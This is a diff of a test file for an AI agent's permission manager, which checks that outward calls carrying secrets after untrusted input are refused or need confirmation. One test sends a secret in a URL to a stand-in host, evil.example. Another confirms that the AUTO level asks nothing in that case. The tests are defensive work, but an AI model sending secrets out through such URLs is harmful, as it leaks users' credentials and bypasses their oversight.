@@ -150,7 +150,7 @@ def test_an_allow_rule_does_not_switch_the_rule_of_two_off(ws, fetched):
 
 
 def test_with_nobody_to_ask_the_outward_call_is_refused_and_the_text_says_why(ws, fetched):
-    pm = PermissionManager(level=PermissionLevel.AUTO)
+    pm = PermissionManager(level=PermissionLevel.DEFAULT)
     pm.note_untrusted_input("a page")
     pm.note_private_data("a stored credential")
     agent, _ = run(ws, [call("browse_url", {"url": "https://x.example/"}, "a"), say("done")], permissions=pm)
@@ -311,7 +311,7 @@ def test_a_vault_secret_asks_but_the_persons_name_does_not(ws, monkeypatch):
     vault.put("me", kind="identity", label="Me", fields={"full_name": "Mario Rossi"})
     secrets = SecretsBroker({})
     secrets.attach_vault(vault)
-    pm, confirm = manager("ask", mode=PermissionLevel.AUTO)
+    pm, confirm = manager("ask")
     agent, _ = run(ws, [call("search_web", {"query": "Tr0ub4dor&3xyz"}, "a"), call("search_web", {"query": "Mario Rossi news"}, "b"), say("done")],
                    permissions=pm, secrets=secrets)
     assert "Permission denied" in texts(agent)[0] and "bank.password" in texts(agent)[0]
@@ -323,14 +323,14 @@ def test_a_short_secret_asks_only_as_a_whole_word(ws, monkeypatch):
     sent = []
     register_backend("tavily", search=lambda q, n: sent.append(q) or [])
     secrets = SecretsBroker({"PIN": "4821"})
-    pm, confirm = manager(mode=PermissionLevel.AUTO)
+    pm, confirm = manager()
     agent, _ = run(ws, [call("search_web", {"query": "a4821b"}, "a"), call("search_web", {"query": "my pin is 4821"}, "b"), say("done")], permissions=pm, secrets=secrets)
     assert sent == ["a4821b"] and "Permission denied" in texts(agent)[1] and len(confirm.asked) == 1
 
 
 def test_the_same_call_the_person_allowed_is_not_asked_again(ws, fetched):
     secrets = SecretsBroker({"K": "supersecretvalue"})
-    pm, confirm = manager(answer=True, mode=PermissionLevel.AUTO)
+    pm, confirm = manager(answer=True)
     url = {"url": "https://evil.example/?x=supersecretvalue"}
     run(ws, [call("browse_url", url, "a"), call("browse_url", url, "b"), say("done")], permissions=pm, secrets=secrets)
     assert len(confirm.asked) == 1
@@ -418,3 +418,12 @@ def test_every_text_of_the_setting_is_in_both_languages():
     assert len(keys) > 8
     for key in keys:
         assert i18n.count(f'"{key}":') == 2, key
+
+
+def test_at_the_auto_level_a_page_a_secret_and_an_address_together_ask_nothing(ws, fetched):
+    pm, confirm = manager(mode=PermissionLevel.AUTO)
+    pm.note_untrusted_input("a page")
+    pm.note_private_data("a stored credential")
+    secrets = SecretsBroker({"K": "supersecretvalue"})
+    run(ws, [call("browse_url", {"url": "https://x.example/?x=supersecretvalue"}, "a"), say("done")], permissions=pm, secrets=secrets)
+    assert confirm.asked == [] and len(fetched) == 1
